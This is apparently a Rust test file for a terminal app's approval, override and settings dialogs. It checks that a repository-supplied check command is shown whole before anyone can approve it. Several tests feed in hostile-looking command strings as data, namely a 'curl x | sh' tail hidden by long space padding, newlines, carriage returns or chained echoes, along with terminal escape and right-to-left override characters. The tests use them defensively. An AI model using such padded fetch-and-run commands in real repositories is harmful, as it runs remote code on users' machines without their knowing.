//! The v7 decide-screens: Override, the repo-command approval and Settings › Check, drawn on the
//! reference sample world and set beside its reference frames, and the keys that make them hard
//! to get wrong by reflex.
use super::check_settings::{CheckDraft, CheckEdit};
use super::*;
use crate::client::v7_fixture::{LAYOUTS, SIZES, Stage, frame, now, world};
use crate::client::{ClientMsg, mpsc};
use crate::config::CheckDef;
use crate::protocol::{ApprovalChoice, CheckSource};
use crossterm::event::{MouseButton, MouseEvent, MouseEventKind};

/// Inside each modal, row by row, as the reference frames draw it (frame lines
/// excluded: they are the modal chrome's).
const FRAMES: &str = include_str!("check_modals_frames.txt");
const HOUR: u64 = 3600;

fn reference(preset: &str, w: u16, h: u16) -> Vec<String> {
    let head = format!("===== {preset} | {w}x{h}");
    let at = FRAMES.find(&head).unwrap_or_else(|| panic!("no reference for {head}"));
    let body = &FRAMES[at..];
    // Past the heading's line end, LF or CRLF as the checkout made it.
    let body = &body[body.find('\n').map_or(body.len(), |i| i + 1)..];
    let end = body.find("=====").unwrap_or(body.len());
    body[..end].lines().map(|l| l.replace('\\', std::path::MAIN_SEPARATOR_STR)).collect()
}

/// The modal's rectangle on a `w`×`h` screen, as the reference places it.
fn modal_rect(preset: &str, w: u16, h: u16) -> (usize, usize, usize, usize) {
    let (mw, mh) = match preset.as_bytes()[0] {
        b'1' if preset.starts_with("12") => (70.min(w - 2), 15),
        b'A' => (84.min(w - 2), 20.min(h - 1) - u16::from(h < 30)),
        _ => (80.min(w - 2), 20.min(h - 2)),
    };
    (((w - mw) / 2) as usize, ((h - mh) / 2) as usize, mw as usize, mh as usize)
}

/// The inside of the modal in `text`, pill ends as the plain cells they stand for.
fn inside(text: &str, preset: &str, w: u16, h: u16) -> Vec<String> {
    let (x, y, mw, mh) = modal_rect(preset, w, h);
    let caps = |c: char| if c == '\u{e0b6}' || c == '\u{e0b4}' { ' ' } else { c };
    text.lines()
        .skip(y + 1)
        .take(mh - 2)
        .map(|l| {
            let cells: Vec<char> = l.chars().map(caps).chain(std::iter::repeat(' ')).take(w as usize).collect();
            cells[x + 1..x + mw - 1].iter().collect::<String>().trim_end().to_string()
        })
        .collect()
}

fn site(app: &App) -> PathBuf {
    app.snap.terms[&1].root.clone().expect("fix-footer is in a repo")
}

fn with_check(app: &mut App, command: &str) {
    app.cfg.check = vec![CheckDef { project: site(app), name: None, command: command.into(), ..Default::default() }];
}

fn key(app: &mut App, code: KeyCode) {
    app.on_key(KeyEvent::new(code, KeyModifiers::NONE));
}

fn ctrl(app: &mut App, c: char) {
    app.on_key(KeyEvent::new(KeyCode::Char(c), KeyModifiers::CONTROL));
}

fn listening(app: &mut App) -> mpsc::UnboundedReceiver<ClientMsg> {
    let (tx, rx) = mpsc::unbounded_channel();
    app.out = tx;
    rx
}

fn sent(rx: &mut mpsc::UnboundedReceiver<ClientMsg>) -> Vec<Command> {
    std::iter::from_fn(|| rx.try_recv().ok())
        .filter_map(|m| match m {
            ClientMsg::Command(c) => Some(c),
            _ => None,
        })
        .collect()
}

fn toast(app: &App) -> String {
    app.notice.as_ref().map(|(m, ..)| m.clone()).unwrap_or_default()
}

/// A click on the control drawn for `want`.
fn click(app: &mut App, want: ScreenHit) {
    frame(app, crate::client::v7_fixture::Layout::Floating, 160, 45, "unicode");
    let (r, _) = *app.hits.iter().rev().find(|(_, h)| *h == Hit::Screen(want)).unwrap_or_else(|| panic!("nothing drawn for {want:?}"));
    for kind in [MouseEventKind::Down(MouseButton::Left), MouseEventKind::Up(MouseButton::Left)] {
        app.on_mouse(MouseEvent { kind, column: r.x, row: r.y, modifiers: KeyModifiers::NONE });
    }
}

/// fix-footer's repo changed the command you had said Always to, two hours ago.
fn changed_command(app: &mut App) {
    let check = &mut app.snap.terms.get_mut(&1).unwrap().checks[0];
    check.previous_command = Some("npm test".into());
    check.command = "npm test && node scripts/seed.js".into();
    check.source = CheckSource::Repo { file: concat!(".", env!("APP_COMMAND"), "/checks.toml").into(), commit: Some("9f3c2a1".into()), committed_at: Some(now() - 2 * HOUR), uncommitted: false };
}

/// Each preset's world with its modal open.
fn preset(name: &str) -> App {
    let mut app = match &name[..3] {
        "12 " => {
            let mut app = world(Stage::Failed);
            app.ask_override(1, None);
            app.on_paste("flaky legal test, tracked in #212".into());
            app
        }
        "14 " => world(Stage::None),
        "15 " => world(Stage::Passed),
        "16 " => world(Stage::None),
        "17 " => world(Stage::Couldnt),
        _ => world(Stage::Approve),
    };
    match &name[..3] {
        "15 " | "16 " => with_check(&mut app, "npm test"),
        "17 " => with_check(&mut app, "pnpm test"),
        "A4 " => changed_command(&mut app),
        _ => {}
    }
    match &name[..1] {
        "1" if !name.starts_with("12") => app.open_project_check(1),
        "A" => app.open_approval(1),
        _ => {}
    }
    if name.starts_with("A3") {
        shown(&mut app);
        key(&mut app, KeyCode::Char('2'));
    }
    app
}

#[test]
fn each_modal_matches_the_reference_inside_in_every_layout_at_every_size() {
    let presets = [
        "12 Override?",
        "14 Settings · empty",
        "15 Settings · set",
        "16 Settings · never run",
        "17 Settings · command missing",
        "A2 Approve · read first",
        "A3 Approve · confirm always",
        "A4 Approve · command changed",
    ];
    for name in presets {
        let mut app = preset(name);
        for layout in LAYOUTS {
            for (w, h) in SIZES {
                let text = frame(&mut app, layout, w, h, "unicode");
                let got = inside(&text, name, w, h);
                assert_eq!(got, reference(name, w, h), "{name} | {layout:?} | {w}x{h}\n{text}");
            }
        }
    }
}

#[test]
fn the_override_keeps_its_mark_in_plain_ascii() {
    let mut app = preset("12 Override?");
    let text = frame(&mut app, crate::client::v7_fixture::Layout::Flat, 80, 24, "ascii");
    assert!(text.contains("  / on the row, in the Inbox history and in the evidence"), "{text}");
}

// ---- approval ------------------------------------------------------------------------------

fn approving() -> (App, mpsc::UnboundedReceiver<ClientMsg>) {
    let mut app = world(Stage::Approve);
    let rx = listening(&mut app);
    app.open_approval(1);
    assert!(matches!(app.mode, Mode::Approve(_)));
    shown(&mut app);
    (app, rx)
}

/// Draw the modal, as the screen does before any key reaches it.
fn shown(app: &mut App) -> String {
    frame(app, crate::client::v7_fixture::Layout::Flat, 160, 45, "unicode")
}

fn set_command(app: &mut App, command: &str) {
    app.snap.terms.get_mut(&1).unwrap().checks.iter_mut().find(|c| c.name == "test").unwrap().command = command.into();
}

fn choice(cmds: &[Command]) -> Vec<ApprovalChoice> {
    cmds.iter()
        .filter_map(|c| match c {
            Command::ApproveCheck { term: 1, name, choice, .. } if name == "test" => Some(*choice),
            _ => None,
        })
        .collect()
}

#[test]
fn enter_y_and_space_never_approve_and_say_how_to_choose() {
    let (mut app, mut rx) = approving();
    for code in [KeyCode::Enter, KeyCode::Char('y'), KeyCode::Char(' ')] {
        app.notice = None;
        key(&mut app, code);
        assert!(sent(&mut rx).is_empty(), "{code:?} sends nothing");
        assert!(matches!(app.mode, Mode::Approve(_)), "{code:?} keeps it open");
        assert_eq!(toast(&app), "Enter and y do nothing here. Choose 1, 2 or 3.");
    }
    for code in [KeyCode::Char('n'), KeyCode::Char('a'), KeyCode::Tab, KeyCode::Char('4')] {
        app.notice = None;
        key(&mut app, code);
        assert!(sent(&mut rx).is_empty() && app.notice.is_none(), "{code:?} does nothing");
    }
    app.on_paste("2".into());
    app.on_paste("2".into());
    assert!(sent(&mut rx).is_empty(), "a paste is not a choice");
}

#[test]
fn always_takes_two_presses_of_2_and_the_first_only_arms_it() {
    let (mut app, mut rx) = approving();
    key(&mut app, KeyCode::Char('2'));
    assert!(sent(&mut rx).is_empty(), "one 2 sends nothing");
    assert!(matches!(&app.mode, Mode::Approve(a) if a.armed));
    let text = frame(&mut app, crate::client::v7_fixture::Layout::Flat, 160, 45, "unicode");
    assert!(text.contains("Press 2 again to always run this exact command for affiliate-site.") && text.contains("Always for this repo 2 again"), "{text}");
    key(&mut app, KeyCode::Char('2'));
    assert_eq!(choice(&sent(&mut rx)), [ApprovalChoice::Always]);
    assert!(matches!(app.mode, Mode::Normal));
    assert_eq!(toast(&app), "Always for affiliate-site. Asks again if the command changes.");
}

#[test]
fn one_runs_once_and_escape_sends_nothing() {
    let (mut app, mut rx) = approving();
    key(&mut app, KeyCode::Char('1'));
    assert_eq!(choice(&sent(&mut rx)), [ApprovalChoice::Once]);
    assert!(matches!(app.mode, Mode::Normal));
    assert_eq!(toast(&app), "Running once. Asks again next turn.");
    let (mut app, mut rx) = approving();
    key(&mut app, KeyCode::Esc);
    assert!(sent(&mut rx).is_empty() && matches!(app.mode, Mode::Normal), "Not now: the item stays waiting");
}

#[test]
fn three_never_runs_it_and_opens_the_evidence() {
    let (mut app, mut rx) = approving();
    key(&mut app, KeyCode::Char('3'));
    assert_eq!(choice(&sent(&mut rx)), [ApprovalChoice::Never]);
    assert!(matches!(&app.view, Some(crate::client::View::Check(v)) if v.term == 1), "the evidence sheet is on it");
    assert_eq!(toast(&app), "Never: this repo's check will not run. Change it in Settings › Check.");
}

#[test]
fn every_button_clicks_and_always_arms_on_the_first_click() {
    let (mut app, mut rx) = approving();
    click(&mut app, ScreenHit::Approve(ApproveHit::Always));
    assert!(sent(&mut rx).is_empty() && matches!(&app.mode, Mode::Approve(a) if a.armed), "one click arms it");
    click(&mut app, ScreenHit::Approve(ApproveHit::Always));
    assert_eq!(choice(&sent(&mut rx)), [ApprovalChoice::Always]);
    for (hit, want) in [(ApproveHit::Once, Some(ApprovalChoice::Once)), (ApproveHit::Never, Some(ApprovalChoice::Never)), (ApproveHit::NotNow, None)] {
        let (mut app, mut rx) = approving();
        click(&mut app, ScreenHit::Approve(hit));
        assert_eq!(choice(&sent(&mut rx)), want.into_iter().collect::<Vec<_>>(), "{hit:?}");
        assert!(!matches!(app.mode, Mode::Approve(_)), "{hit:?} closes it");
    }
}

#[test]
fn it_opens_only_from_its_item_never_by_itself() {
    let mut app = world(Stage::Approve);
    let snap = app.snap.clone();
    app.on_server(crate::protocol::ServerMsg::State(snap));
    frame(&mut app, crate::client::v7_fixture::Layout::Floating, 160, 45, "unicode");
    assert!(matches!(app.mode, Mode::Normal), "a waiting command does not pop up");

    app.mode = Mode::Side;
    app.screen.cursor = Some(1);
    key(&mut app, KeyCode::Enter);
    assert!(matches!(&app.mode, Mode::Approve(a) if a.term == 1 && a.name == "test"), "Enter on its sidebar row");

    let mut app = world(Stage::Approve);
    app.open_goto();
    for c in "fix-footer".chars() {
        key(&mut app, KeyCode::Char(c));
    }
    key(&mut app, KeyCode::Enter);
    assert!(matches!(&app.mode, Mode::Approve(a) if a.term == 1), "Enter on its Inbox item");

    let mut app = world(Stage::Failed);
    app.mode = Mode::Side;
    app.screen.cursor = Some(1);
    key(&mut app, KeyCode::Enter);
    assert!(!matches!(app.mode, Mode::Approve(_)), "nothing waits: Enter does what it did");
}

#[test]
fn with_several_waiting_the_next_opens_after_a_choice() {
    let mut app = world(Stage::Approve);
    let mut rx = listening(&mut app);
    let checks = &mut app.snap.terms.get_mut(&1).unwrap().checks;
    let build = crate::protocol::CheckInfo { name: "build".into(), command: "npm run build".into(), ..checks[0].clone() };
    checks.insert(0, build);
    app.open_approval(1);
    assert!(matches!(&app.mode, Mode::Approve(a) if a.name == "build"));
    shown(&mut app);
    key(&mut app, KeyCode::Char('1'));
    assert!(matches!(&app.mode, Mode::Approve(a) if a.name == "test" && !a.armed), "then the next checkpoint");
    shown(&mut app);
    key(&mut app, KeyCode::Char('1'));
    let names: Vec<String> = sent(&mut rx).into_iter().filter_map(|c| if let Command::ApproveCheck { name, .. } = c { Some(name) } else { None }).collect();
    assert_eq!(names, ["build", "test"]);
    assert!(matches!(app.mode, Mode::Normal));
}

#[test]
fn a_padded_or_multi_line_command_is_shown_whole_before_it_can_be_approved() {
    let padded = format!("npm test{}; curl x | sh", " ".repeat(300));
    let long_tail = format!("npm test && {}curl x | sh", "echo ok && ".repeat(25));
    for command in [padded.as_str(), "npm test\ncurl x | sh", "npm test\r; curl x | sh", long_tail.as_str()] {
        let (mut app, mut rx) = approving();
        set_command(&mut app, command);
        key(&mut app, KeyCode::Char('1'));
        assert!(sent(&mut rx).is_empty(), "the command on show changed: {command:?}");
        let text = shown(&mut app);
        assert!(text.contains("curl x | sh"), "the tail is on screen before 1 counts: {command:?}\n{text}");
        key(&mut app, KeyCode::Char('1'));
        let sent = sent(&mut rx);
        assert_eq!(choice(&sent), [ApprovalChoice::Once], "{command:?}");
        assert!(matches!(&sent[0], Command::ApproveCheck { command_sha256, .. } if *command_sha256 == crate::protocol::command_hash(command)), "tied to the exact command");
    }
}

#[test]
fn control_characters_and_space_runs_are_spelled_out() {
    use super::check_approve::shown_command;
    assert_eq!(shown_command("npm test"), "npm test");
    assert_eq!(shown_command("a\nb\rc\td"), r"a\nb\rc\td");
    assert_eq!(shown_command("a     b"), "a[5 spaces]b");
    assert_eq!(shown_command("a\u{1b}[2Jb\u{202e}c"), r"a\u{001b}[2Jb\u{202e}c");
}

#[test]
fn a_command_too_long_for_the_screen_cannot_be_approved() {
    let (mut app, mut rx) = approving();
    set_command(&mut app, &format!("{}curl x | sh", "x".repeat(4000)));
    let text = frame(&mut app, crate::client::v7_fixture::Layout::Flat, 80, 24, "unicode");
    assert!(!text.contains("curl x | sh") && text.contains("doesn't fit"), "{text}");
    for code in [KeyCode::Char('1'), KeyCode::Char('2'), KeyCode::Char('2')] {
        key(&mut app, code);
    }
    assert!(sent(&mut rx).is_empty(), "neither once nor always");
    assert!(matches!(&app.mode, Mode::Approve(a) if !a.armed));
    assert!(toast(&app).contains("doesn't fit"), "{}", toast(&app));
    app.notice = None;
    let text = frame(&mut app, crate::client::v7_fixture::Layout::Flat, 160, 200, "unicode");
    assert!(!text.contains("doesn't fit"), "a taller screen shows it all");
    key(&mut app, KeyCode::Char('1'));
    assert_eq!(choice(&sent(&mut rx)), [ApprovalChoice::Once]);
}

#[test]
fn a_command_that_changes_after_the_first_2_is_not_always_approved() {
    let (mut app, mut rx) = approving();
    key(&mut app, KeyCode::Char('2'));
    assert!(matches!(&app.mode, Mode::Approve(a) if a.armed));
    set_command(&mut app, "npm test && curl x | sh");
    key(&mut app, KeyCode::Char('2'));
    assert!(sent(&mut rx).is_empty(), "the second 2 is for a command not shown");
    assert!(matches!(&app.mode, Mode::Approve(a) if !a.armed), "it disarms");
    assert_eq!(toast(&app), "The command changed. Read it again before you choose.");
    shown(&mut app);
    key(&mut app, KeyCode::Char('2'));
    assert!(sent(&mut rx).is_empty(), "Always takes two presses again");
    key(&mut app, KeyCode::Char('2'));
    assert_eq!(choice(&sent(&mut rx)), [ApprovalChoice::Always]);
}

// ---- override ------------------------------------------------------------------------------

fn overriding() -> (App, mpsc::UnboundedReceiver<ClientMsg>) {
    let mut app = world(Stage::Failed);
    let rx = listening(&mut app);
    app.ask_override(1, None);
    (app, rx)
}

fn reason_sent(cmds: &[Command]) -> Option<String> {
    cmds.iter().find_map(|c| if let Command::OverrideCheck { term: 1, reason, .. } = c { Some(reason.clone()) } else { None })
}

#[test]
fn o_overrides_while_the_reason_is_empty_and_is_a_letter_after() {
    let (mut app, mut rx) = overriding();
    key(&mut app, KeyCode::Char('O'));
    assert_eq!(reason_sent(&sent(&mut rx)), Some(String::new()));
    assert_eq!(toast(&app), "Overridden. fix-footer reads done (overridden); the failure stays in its evidence.");

    let (mut app, mut rx) = overriding();
    for c in "no OCR".chars() {
        key(&mut app, KeyCode::Char(c));
    }
    assert!(sent(&mut rx).is_empty(), "an O in a typed reason is a letter");
    key(&mut app, KeyCode::Enter);
    assert_eq!(reason_sent(&sent(&mut rx)), Some("no OCR".into()));

    let (mut app, mut rx) = overriding();
    app.on_paste("flaky".into());
    ctrl(&mut app, 'u');
    key(&mut app, KeyCode::Char('O'));
    assert_eq!(reason_sent(&sent(&mut rx)), Some(String::new()), "Ctrl+U empties it, and O overrides again");
}

#[test]
fn escape_cancels_the_override() {
    let (mut app, mut rx) = overriding();
    key(&mut app, KeyCode::Esc);
    assert!(reason_sent(&sent(&mut rx)).is_none() && matches!(app.mode, Mode::Normal));
}

// ---- settings › check ----------------------------------------------------------------------

#[test]
fn comma_opens_the_project_s_check_from_the_evidence_and_the_inbox() {
    let mut app = world(Stage::Failed);
    app.open_check_sheet(1);
    key(&mut app, KeyCode::Char(','));
    assert!(matches!(&app.mode, Mode::ProjectCheck(d) if d.project == site(&app)));

    let mut app = world(Stage::Failed);
    app.open_goto();
    let rows = goto_rows(&app.screen_model(), "", 0);
    let at = rows.iter().position(|r| *r == GoRow::Failed(1)).expect("fix-footer in FAILED CHECKS");
    app.mode = Mode::GoTo { query: String::new(), sel: at };
    key(&mut app, KeyCode::Char(','));
    assert!(matches!(&app.mode, Mode::ProjectCheck(_)));
}

#[test]
fn several_checkpoints_switch_with_the_arrows_on_their_row() {
    let mut app = world(Stage::Multi);
    let project = site(&app);
    app.cfg.check = ["npm run build", "npm test"].map(|c| CheckDef { project: project.clone(), command: c.into(), ..Default::default() }).into();
    app.open_project_check(1);
    let text = frame(&mut app, crate::client::v7_fixture::Layout::Floating, 160, 45, "unicode");
    assert!(text.contains("CHECKPOINTS  1 of 2 · ‹ › switch") && text.contains("npm run build"), "{text}");
    key(&mut app, KeyCode::Down);
    key(&mut app, KeyCode::Down);
    key(&mut app, KeyCode::Right);
    let text = frame(&mut app, crate::client::v7_fixture::Layout::Floating, 160, 45, "unicode");
    assert!(text.contains("CHECKPOINTS  2 of 2 · ‹ › switch") && text.contains("Command    npm test"), "{text}");
    assert!(text.contains("✕ failed on fix-footer 14:22 · exit 1"), "the selected checkpoint's own result\n{text}");
}

#[test]
fn a_repo_s_checkpoint_is_read_only_and_del_forgets_your_choice() {
    let mut app = world(Stage::Never);
    let mut rx = listening(&mut app);
    app.open_project_check(1);
    let text = frame(&mut app, crate::client::v7_fixture::Layout::Floating, 160, 45, "unicode");
    assert!(text.contains(concat!("Source    .", env!("APP_COMMAND"), "/checks.toml · a1b2c3d · never")) && text.contains("Forget choice Del"), "{text}");
    key(&mut app, KeyCode::Char('x'));
    assert!(matches!(&app.mode, Mode::ProjectCheck(d) if !d.editing && d.command.is_none()), "its command is not yours to type");
    key(&mut app, KeyCode::Delete);
    let forgot = sent(&mut rx).into_iter().any(|c| matches!(c, Command::ForgetCheckApproval { ref project, ref name } if *project == site(&app) && name == "test"));
    assert!(forgot, "Del sends ForgetCheckApproval");
}

#[test]
fn typing_edits_the_draft_and_escape_drops_it() {
    let mut app = world(Stage::None);
    app.open_project_check(1);
    for c in "npm test".chars() {
        key(&mut app, KeyCode::Char(c));
    }
    assert!(matches!(&app.mode, Mode::ProjectCheck(d) if d.command.as_deref() == Some("npm test") && d.editing));
    let text = frame(&mut app, crate::client::v7_fixture::Layout::Floating, 100, 30, "unicode");
    assert!(text.contains("Command    npm test█"), "{text}");
    key(&mut app, KeyCode::Esc);
    assert!(matches!(app.mode, Mode::Normal) && app.cfg.check.is_empty(), "nothing saved");
}

#[test]
fn a_failed_save_keeps_the_draft_and_a_good_one_closes_with_its_toast() {
    let mut app = world(Stage::None);
    let project = site(&app);
    app.mode = Mode::ProjectCheck(Box::new(CheckDraft { command: Some("pnpm test".into()), saving: true, ..CheckDraft::new(project.clone()) }));
    app.check_saved(Err(anyhow::anyhow!("disk full")), "Saved. Runs after the next turn ends.", true);
    assert!(matches!(&app.mode, Mode::ProjectCheck(d) if d.command.as_deref() == Some("pnpm test") && !d.saving));
    assert!(toast(&app).contains("couldn't save") && toast(&app).contains("disk full"));
    let mut cfg = app.cfg.clone();
    cfg.check = vec![CheckDef { project, command: "pnpm test".into(), ..Default::default() }];
    app.check_saved(Ok(cfg), "Saved. Runs after the next turn ends.", true);
    assert!(matches!(app.mode, Mode::Normal));
    assert_eq!(toast(&app), "Saved. Runs after the next turn ends.");
}

#[test]
fn saving_writes_the_named_check_in_place_and_keeps_comments() {
    let before = "# mine\n[[check]]\nproject = \"/a\"\ncommand = \"npm run build\" # the build\n\n# tests\n[[check]]\nproject = \"/a\"\nname = \"unit\"\ncommand = \"npm test\"\ntimeout_s = 600\n";
    let mut doc: toml_edit::DocumentMut = before.parse().unwrap();
    CheckEdit::Set { project: "/a".into(), name: Some("unit".into()), command: "npm test -- --run".into(), timeout_s: 900 }.apply(&mut doc).unwrap();
    CheckEdit::Set { project: "/a".into(), name: Some("build".into()), command: "npm run compile".into(), timeout_s: 600 }.apply(&mut doc).unwrap();
    let out = doc.to_string();
    assert!(out.contains("# mine") && out.contains("# tests") && out.contains("# the build"), "{out}");
    let cfg: crate::config::Config = toml::from_str(&out).unwrap();
    let got: Vec<_> = cfg.check.iter().map(|c| (c.name(), c.command.as_str(), c.timeout_s)).collect();
    assert_eq!(got, [("build", "npm run compile", 600), ("unit", "npm test -- --run", 900)], "each in its own table, the build keeping its name\n{out}");
    CheckEdit::Remove { project: "/a".into(), name: "unit".into() }.apply(&mut doc).unwrap();
    let cfg: crate::config::Config = toml::from_str(&doc.to_string()).unwrap();
    assert_eq!(cfg.check.iter().map(|c| c.name()).collect::<Vec<_>>(), ["build"]);
}

#[test]
fn ctrl_s_with_nothing_to_write_says_so_and_saves_nothing() {
    let mut app = world(Stage::Passed);
    with_check(&mut app, "npm test");
    app.open_project_check(1);
    ctrl(&mut app, 's');
    assert_eq!(toast(&app), "nothing changed");
    assert!(matches!(&app.mode, Mode::ProjectCheck(d) if !d.saving));
    let mut app = world(Stage::None);
    app.open_project_check(1);
    ctrl(&mut app, 's');
    assert_eq!(toast(&app), "type a command first");
}
